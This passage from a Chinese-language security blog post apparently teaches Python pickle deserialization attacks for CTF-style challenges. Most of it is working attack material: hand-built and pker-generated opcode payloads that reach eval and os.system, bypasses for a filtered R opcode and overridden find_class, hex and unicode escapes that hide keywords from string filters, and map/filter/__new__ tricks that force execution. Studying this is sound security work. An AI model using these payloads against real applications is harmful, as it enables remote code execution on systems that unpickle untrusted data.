<p>例如这里就出现了<code>os</code>.</p>
<p>道理和上边一样.</p>
<p>pker的输入</p>
<div class="highlight"><pre><span></span><span class="n">globa1</span><span class="o">=</span><span class="n">GLOBAL</span><span class="p">(</span><span class="s2">"builtins"</span><span class="p">,</span><span class="s2">"globals"</span><span class="p">)</span>
<span class="n">glob</span><span class="o">=</span><span class="n">globa1</span><span class="p">()</span>
<span class="nb">dict</span><span class="o">=</span><span class="n">GLOBAL</span><span class="p">(</span><span class="s2">"builtins"</span><span class="p">,</span><span class="s2">"dict"</span><span class="p">)</span>
<span class="nb">getattr</span><span class="o">=</span><span class="n">GLOBAL</span><span class="p">(</span><span class="s2">"builtins"</span><span class="p">,</span><span class="s2">"getattr"</span><span class="p">)</span>
<span class="n">get</span><span class="o">=</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">dict</span><span class="p">,</span><span class="s2">"get"</span><span class="p">)</span>
<span class="n">builtins</span><span class="o">=</span><span class="n">get</span><span class="p">(</span><span class="n">glob</span><span class="p">,</span><span class="s2">"__builtins__"</span><span class="p">)</span>
<span class="nb">eval</span><span class="o">=</span><span class="nb">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span><span class="s2">"eval"</span><span class="p">)</span>
<span class="nb">eval</span><span class="p">(</span><span class="s1">'__import__("os").system("whoami")'</span><span class="p">)</span>
<span class="k">return</span>
</pre></div>
<p>生成的opcode</p>
<div class="highlight"><pre><span></span><span class="n">output</span><span class="o">=</span><span class="sa">b</span><span class="s1">'cbuiltins</span><span class="se">\n</span><span class="s1">globals</span><span class="se">\n</span><span class="s1">p0</span><span class="se">\n</span><span class="s1">0g0</span><span class="se">\n</span><span class="s1">(tRp1</span><span class="se">\n</span><span class="s1">0cbuiltins</span><span class="se">\n</span><span class="s1">dict</span><span class="se">\n</span><span class="s1">p2</span><span class="se">\n</span><span class="s1">0cbuiltins</span><span class="se">\n</span><span class="s1">getattr</span><span class="se">\n</span><span class="s1">p3</span><span class="se">\n</span><span class="s1">0g3</span><span class="se">\n</span><span class="s1">(g2</span><span class="se">\n</span><span class="s1">S</span><span class="se">\'</span><span class="s1">get</span><span class="se">\'\n</span><span class="s1">tRp4</span><span class="se">\n</span><span class="s1">0g4</span><span class="se">\n</span><span class="s1">(g1</span><span class="se">\n</span><span class="s1">S</span><span class="se">\'</span><span class="s1">__builtins__</span><span class="se">\'\n</span><span class="s1">tRp5</span><span class="se">\n</span><span class="s1">0g3</span><span class="se">\n</span><span class="s1">(g5</span><span class="se">\n</span><span class="s1">S</span><span class="se">\'</span><span class="s1">eval</span><span class="se">\'\n</span><span class="s1">tRp6</span><span class="se">\n</span><span class="s1">0g6</span><span class="se">\n</span><span class="s1">(S</span><span class="se">\'</span><span class="s1">__import__("os").system("whoami")</span><span class="se">\'\n</span><span class="s1">tR.'</span>
</pre></div>
<p><code>R</code>操作符被过滤时,可以使用如下payload:</p>
<div class="highlight"><pre><span></span><span class="n">opcode</span><span class="o">=</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x80\x03</span><span class="s1">(cbuiltins</span><span class="se">\n</span><span class="s1">getattr</span><span class="se">\n</span><span class="s1">p0</span><span class="se">\n</span><span class="s1">cbuiltins</span><span class="se">\n</span><span class="s1">dict</span><span class="se">\n</span><span class="s1">p1</span><span class="se">\n</span><span class="s1">X</span><span class="se">\x03\x00\x00\x00</span><span class="s1">getop2</span><span class="se">\n</span><span class="s1">0(g2</span><span class="se">\n</span><span class="s1">(cbuiltins</span><span class="se">\n</span><span class="s1">globals</span><span class="se">\n</span><span class="s1">oX</span><span class="se">\x0C\x00\x00\x00</span><span class="s1">__builtins__op3</span><span class="se">\n</span><span class="s1">(g0</span><span class="se">\n</span><span class="s1">g3</span><span class="se">\n</span><span class="s1">X</span><span class="se">\x04\x00\x00\x00</span><span class="s1">evalop4</span><span class="se">\n</span><span class="s1">(g4</span><span class="se">\n</span><span class="s1">X</span><span class="se">\x21\x00\x00\x00</span><span class="s1">__import__("os").system("calc")o00.</span>
</pre></div>
<h5 data-content="1" id="d11cdf16a2501877a93c10fbca1ec1fb">思路二 获取没有被重写的<code>pickle.loads</code>函数</h5>
<p>构造的payload <code>builtins.dict.get(builtins.globals(),"pickle").loads()</code>但是这个思路有个bug,<code>loads()</code>函数只能传入<code>byte</code>类型的字符串.所以对于v0的opcode必须要引入其他函数来改变字符串类型.这就导致可能不能很好地绕过<code>find_class()</code>的重写.好在在v3的opcode中有<code>B</code>和<code>C</code>操作符可以向栈中压入byte类型的字符串.但是pker不能直接调用操作符.就需要我们自己手搓.</p>
<p>pker的输入</p>
<div class="highlight"><pre><span></span><span class="n">funcglob</span><span class="o">=</span><span class="n">GLOBAL</span><span class="p">(</span><span class="s2">"builtins"</span><span class="p">,</span><span class="s2">"globals"</span><span class="p">)</span>
<span class="n">glob</span><span class="o">=</span><span class="n">funcglob</span><span class="p">()</span>
<span class="nb">dict</span><span class="o">=</span><span class="n">GLOBAL</span><span class="p">(</span><span class="s2">"builtins"</span><span class="p">,</span><span class="s2">"dict"</span><span class="p">)</span>
<span class="nb">getattr</span><span class="o">=</span><span class="n">GLOBAL</span><span class="p">(</span><span class="s2">"builtins"</span><span class="p">,</span><span class="s2">"getattr"</span><span class="p">)</span>
<span class="n">get</span><span class="o">=</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">dict</span><span class="p">,</span><span class="s2">"get"</span><span class="p">)</span>
<span class="n">pickle</span><span class="o">=</span><span class="n">get</span><span class="p">(</span><span class="n">glob</span><span class="p">,</span><span class="s2">"pickle"</span><span class="p">)</span>
<span class="n">loads</span><span class="o">=</span><span class="nb">getattr</span><span class="p">(</span><span class="n">pickle</span><span class="p">,</span><span class="s2">"loads"</span><span class="p">)</span>
<span class="n">loads</span><span class="p">(</span><span class="s2">"bytestr"</span><span class="p">)</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">opcode</span><span class="o">=</span><span class="sa">b</span><span class="s2">"cbuiltins</span><span class="se">\n</span><span class="s2">globals</span><span class="se">\n</span><span class="s2">p0</span><span class="se">\n</span><span class="s2">0g0</span><span class="se">\n</span><span class="s2">(tRp1</span><span class="se">\n</span><span class="s2">0cbuiltins</span><span class="se">\n</span><span class="s2">dict</span><span class="se">\n</span><span class="s2">p2</span><span class="se">\n</span><span class="s2">0cbuiltins</span><span class="se">\n</span><span class="s2">getattr</span><span class="se">\n</span><span class="s2">p3</span><span class="se">\n</span><span class="s2">0g3</span><span class="se">\n</span><span class="s2">(g2</span><span class="se">\n</span><span class="s2">S'get'</span><span class="se">\n</span><span class="s2">tRp4</span><span class="se">\n</span><span class="s2">0g4</span><span class="se">\n</span><span class="s2">(g1</span><span class="se">\n</span><span class="s2">S'pickle'</span><span class="se">\n</span><span class="s2">tRp5</span><span class="se">\n</span><span class="s2">0g3</span><span class="se">\n</span><span class="s2">(g5</span><span class="se">\n</span><span class="s2">S'loads'</span><span class="se">\n</span><span class="s2">tRp6</span><span class="se">\n</span><span class="s2">0g6</span><span class="se">\n</span><span class="s2">(S'bytestr'</span><span class="se">\n</span><span class="s2">tR"</span>
</pre></div>
<p>这里需要把生成的opcode的<code>S'bytestr'</code>改成byte字符串,用了<code>B</code></p>
<div class="highlight"><pre><span></span><span class="n">opcode</span><span class="o">=</span><span class="sa">b</span><span class="s2">"cbuiltins</span><span class="se">\n</span><span class="s2">globals</span><span class="se">\n</span><span class="s2">p0</span><span class="se">\n</span><span class="s2">0g0</span><span class="se">\n</span><span class="s2">(tRp1</span><span class="se">\n</span><span class="s2">0cbuiltins</span><span class="se">\n</span><span class="s2">dict</span><span class="se">\n</span><span class="s2">p2</span><span class="se">\n</span><span class="s2">0cbuiltins</span><span class="se">\n</span><span class="s2">getattr</span><span class="se">\n</span><span class="s2">p3</span><span class="se">\n</span><span class="s2">0g3</span><span class="se">\n</span><span class="s2">(g2</span><span class="se">\n</span><span class="s2">S'get'</span><span class="se">\n</span><span class="s2">tRp4</span><span class="se">\n</span><span class="s2">0g4</span><span class="se">\n</span><span class="s2">(g1</span><span class="se">\n</span><span class="s2">S'pickle'</span><span class="se">\n</span><span class="s2">tRp5</span><span class="se">\n</span><span class="s2">0g3</span><span class="se">\n</span><span class="s2">(g5</span><span class="se">\n</span><span class="s2">S'loads'</span><span class="se">\n</span><span class="s2">tRp6</span><span class="se">\n</span><span class="s2">0g6</span><span class="se">\n</span><span class="s2">(B</span><span class="se">\x0E\x00\x00\x00</span><span class="s2">youropcodehere</span><span class="se">\n</span><span class="s2">tR"</span>
</pre></div>
<h4 data-content="1" id="dac66025a458dd97ba347433179b8846">绕过显式字符串检测</h4>
<p><code>V</code>操作符可以进行unicode编码</p>
<div class="highlight"><pre><span></span><span class="n">Vsecr</span>\<span class="n">u0065t</span>
<span class="c1">#secret</span>
</pre></div>
<p><code>S</code>操作符可以识别十六进制</p>
<div class="highlight"><pre><span></span><span class="n">S</span><span class="s1">'</span><span class="se">\x73</span><span class="s1">ecret'</span>
<span class="c1">#secret</span>
</pre></div>
<h4 data-content="1" id="34b96da19f8c30d8962b0441363d7e7e">使用内置函数绕过</h4>
<p>涉及到一对概念:可迭代对象(iterable)和迭代器(iterator).最经典的迭代器就是python中的for循环.</p>
<div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">iterator</span>
    <span class="o">......</span>
</pre></div>
<p>在python中有很多可迭代对象</p>
<ol>
<li>
<strong>序列类型</strong>：<ul>
<li>列表（List）: <code>[1, 2, 3, 4, 5]</code>
</li>
<li>元组（Tuple）: <code>(1, 2, 3)</code>
</li>
<li>字符串（String）: <code>"Hello, World"</code>
</li>
</ul>
</li>
<li>
<strong>映射类型</strong>：<ul>
<li>字典（Dictionary）: <code>{1: 'One', 2: 'Two'}</code>
</li>
<li>注意：虽然字典本身不是可迭代的（字典迭代实质上是迭代其键，使用 <code>keys()</code>、<code>values()</code> 或 <code>items()</code> 方法可以分别迭代键、值或键值对），但从Python 3.3开始，字典也成为了可迭代对象，迭代时会返回其键。</li>
</ul>
</li>
<li>
<strong>集合类型</strong>：<ul>
<li>集合（Set）: <code>{1, 2, 3}</code>
</li>
<li>frozenset（不可变集合）: <code>frozenset({1, 2, 3})</code>
</li>
</ul>
</li>
<li>
<strong>迭代器类型</strong>：<ul>
<li>自定义迭代器类（实现了<code>__iter__()</code>和<code>__next__()</code>方法）</li>
<li>内置迭代器对象，如 <code>range(5)</code> 或者通过 <code>iter()</code> 函数创建的迭代器</li>
</ul>
</li>
<li>
<strong>文件对象</strong>：<ul>
<li>打开的文本文件或二进制文件，可通过逐行读取进行迭代</li>
</ul>
</li>
<li>
<strong>生成器表达式</strong>：<ul>
<li><code>(x*x for x in range(5))</code></li>
</ul>
</li>
<li>其他内置可迭代对象：<ul>
<li>enumerate 对象 (<code>enumerate(list)</code>)</li>
<li>zip 对象 (<code>zip(list1, list2)</code>)</li>
<li>reversed 对象 (<code>reversed(list)</code>)</li>
</ul>
</li>
</ol>
<p>只要一个对象实现了 <code>__iter__()</code> 方法且该方法返回一个迭代器对象，那么这个对象就被认为是可迭代的。在Python中，可以使用 <code>isinstance(obj, collections.abc.Iterable)</code> 来检查一个对象是否是可迭代的。</p>
<p>具体的利用参照这个payload</p>
<div class="highlight"><pre><span></span><span class="nb">next</span><span class="p">(</span><span class="nb">dir</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">'os'</span><span class="p">]))</span>
 <span class="ne">TypeError</span><span class="p">:</span> <span class="s1">'list'</span> <span class="nb">object</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">an</span> <span class="n">iterator</span>
<span class="c1">#如果直接运行这个的话会抛出一个TypeError: 'list' object is not an iterator</span>
<span class="c1">#原因是虽然list是可迭代的,但是他并不是一个迭代器,他并没有__call__函数</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">next</span><span class="p">(</span><span class="nb">iter</span><span class="p">(</span><span class="nb">dir</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">'os'</span><span class="p">])))</span>
<span class="s1">'DirEntry'</span>
<span class="c1">#这才是正确的payload</span>
<span class="c1">#如果想倒着遍历这个列表的话,可以使用reversed()这个函数</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">next</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="nb">dir</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">'os'</span><span class="p">])))</span>
<span class="s1">'write'</span>
</pre></div>
<p>直接手搓比用pker舒服多了</p>
<div class="highlight"><pre><span></span><span class="n">opcode</span><span class="o">=</span><span class="sa">b</span><span class="s2">"""(((c__main__</span>
<span class="s2">secret</span>
<span class="s2">i__builtins__</span>
<span class="s2">dir</span>
<span class="s2">i__builtins__</span>
<span class="s2">reversed</span>
<span class="s2">i__builtins__</span>
<span class="s2">next</span>
<span class="s2">."""</span>
</pre></div>
<p>只用到了<code>c</code>和<code>i</code>,遥遥领先</p>
<h5 data-content="1" id="2a993cb5d69bce4c8da21b188f9beb13">使用类的<code>__new__()</code>构造方法绕过</h5>
<p>着重注意这个操作符</p>
<div class="highlight"><pre><span></span><span class="n">NEWOBJ</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x81</span><span class="s1">'</span><span class="c1">#(这个很有用)  #从栈中弹出两次变量,第一次弹出的变量记为var1,第二次弹出的变量记为var2,然后就会通过cls.__new__(var2, *var1)生成实例化对象,然后将生成的对象压栈</span>
</pre></div>
<p>他是可以触发类的<code>__new__()</code>函数的,所以在某些时候可以寻找可用的<code>__new__()</code>方法进行绕过.在下一个方法中,我们正是用了这一点才代替<code>__next__()</code>方法进行迭代.</p>
<h5 data-content="1" id="ac6bceeffd958086b16bb0185d4578a3">使用<code>map()</code>,<code>filter()</code>函数绕过</h5>
<p>两个函数都是python的内置函数.首先来看<code>map()</code>和<code>filter()</code>是什么</p>
<p>map(<em>function</em>, <em>iterable</em>, *<em>iterables</em>)</p>
<blockquote>
<p>返回一个将 <em>function</em> 应用于 <em>iterable</em> 的每一项，并产生其结果的迭代器。 如果传入了额外的 <em>iterables</em> 参数，则 <em>function</em> 必须接受相同个数的参数并被用于到从所有可迭代对象中并行获取的项。 当有多个可迭代对象时，当最短的可迭代对象耗尽则整个迭代将会停止。</p>
</blockquote>
<p>filter(<em>function</em>, <em>iterable</em>)</p>
<blockquote>
<p>使用 <em>iterable</em> 中 <em>function</em> 返回真值的元素构造一个迭代器。 <em>iterable</em> 可以是一个序列，一个支持迭代的容器或者一个迭代器。 如果 <em>function</em> 为 <code>None</code>，则会使用标识号函数，也就是说，<em>iterable</em> 中所有具有假值的元素都将被移除。</p>
<p>请注意， <code>filter(function, iterable)</code> 相当于一个生成器表达式，当 function 不是 <code>None</code> 的时候为 <code>(item for item in iterable if function(item))</code>；function 是 <code>None</code> 的时候为 <code>(item for item in iterable if item)</code> 。</p>
</blockquote>
<p>注意这两个函数都返回一个迭代器,所以我们需要使用<code>list()</code>函数将其变为一个列表输出.</p>
<p>payload</p>
<div class="highlight"><pre><span></span><span class="nb">map</span><span class="p">(</span><span class="nb">eval</span><span class="p">,[</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">"os"</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">"whoami"</span><span class="p">)])</span>
<span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">eval</span><span class="p">,[</span><span class="s1">'__import__("os").system("whoami")'</span><span class="p">]))</span>
</pre></div>
<p><code>map()</code>和<code>filter()</code>创造的迭代器有一个叫做"懒惰”的特性,也就是需要迭代一次,才能让<code>func</code>调用<code>iterator</code>里的值.所以我们就需要使用<code>__next__()</code>方法对<code>map()</code>创建的迭代器进行迭代</p>
<p>参照<a href="https://xz.aliyun.com/u/51470" target="_blank">AndyNoel</a>师哥的payload:</p>
<div class="highlight"><pre><span></span><span class="nb">bytes</span><span class="o">.</span><span class="fm">__new__</span><span class="p">(</span><span class="nb">bytes</span><span class="p">,</span> <span class="nb">map</span><span class="o">.</span><span class="fm">__new__</span><span class="p">(</span><span class="nb">map</span><span class="p">,</span> <span class="nb">eval</span><span class="p">,</span> <span class="p">[</span><span class="s1">'print(1)'</span><span class="p">]))</span>  <span class="c1"># bytes_new-&gt;PyBytes_FromObject-&gt;_PyBytes_FromIterator-&gt;PyIter_Next</span>
<span class="nb">tuple</span><span class="o">.</span><span class="fm">__new__</span><span class="p">(</span><span class="nb">tuple</span><span class="p">,</span> <span class="nb">map</span><span class="o">.</span><span class="fm">__new__</span><span class="p">(</span><span class="nb">map</span><span class="p">,</span> <span class="k">exec</span><span class="p">,</span> <span class="p">[</span><span class="s2">"print('1')"</span><span class="p">]))</span>  <span class="c1"># tuple_new_impl-&gt;PySequence_Tuple-&gt;PyIter_Next</span>
</pre></div>
<p>这样就可以通过<code>__new__()</code>方法对<code>map()</code>生成的迭代器进行迭代了.</p>
<p>opcode:</p>
<div class="highlight"><pre><span></span><span class="n">opcode</span><span class="o">=</span><span class="sa">b</span><span class="s1">'''c__builtin__</span>
<span class="s1">map</span>
<span class="s1">p0</span>
<span class="s1">0(S'whoami'</span>
<span class="s1">tp1</span>
<span class="s1">0(cos</span>
<span class="s1">system</span>
<span class="s1">g1</span>
<span class="s1">tp2</span>
<span class="s1">0g0</span>
<span class="s1">g2</span>
<span class="se">\x81</span><span class="s1">p3</span>
<span class="s1">0c__builtin__</span>
<span class="s1">tuple</span>
<span class="s1">p4</span>
<span class="s1">(g3</span>
<span class="s1">t</span><span class="se">\x81</span><span class="s1">.'''</span>
</pre></div>
<p>还有</p>
<div class="highlight"><pre><span></span><span class="n">opcode</span><span class="o">=</span><span class="sa">b</span><span class="s1">'''c__builtin__</span>
<span class="s1">map</span>
<span class="s1">p0</span>
<span class="s1">0(S'whoami'</span>
<span class="s1">tp1</span>
<span class="s1">0(cos</span>
<span class="s1">system</span>
<span class="s1">g1</span>
<span class="s1">tp2</span>
<span class="s1">0g0</span>
<span class="s1">g2</span>
<span class="se">\x81</span><span class="s1">p3</span>
<span class="s1">0c__builtin__</span>
<span class="s1">bytes</span>
<span class="s1">p4</span>
<span class="s1">(g3</span>
<span class="s1">t</span><span class="se">\x81</span><span class="s1">.'''</span>
</pre></div>
<p>参考资料</p>
<p><a href="https://goodapple.top/archives/1069" target="_blank">https://goodapple.top/archives/1069</a></p>
<p><a href="https://tttang.com/archive/1782/#toc_waf" target="_blank">https://tttang.com/archive/1782/#toc_waf</a></p>
<p><a href="https://xz.aliyun.com/t/11807" target="_blank">https://xz.aliyun.com/t/11807</a></p>
<p><a href="https://xz.aliyun.com/t/12367" target="_blank">https://xz.aliyun.com/t/12367</a></p>
<p><a href="https://cloud.tencent.com/developer/article/2287499" target="_blank">https://cloud.tencent.com/developer/article/2287499</a></p>
</div>
</div>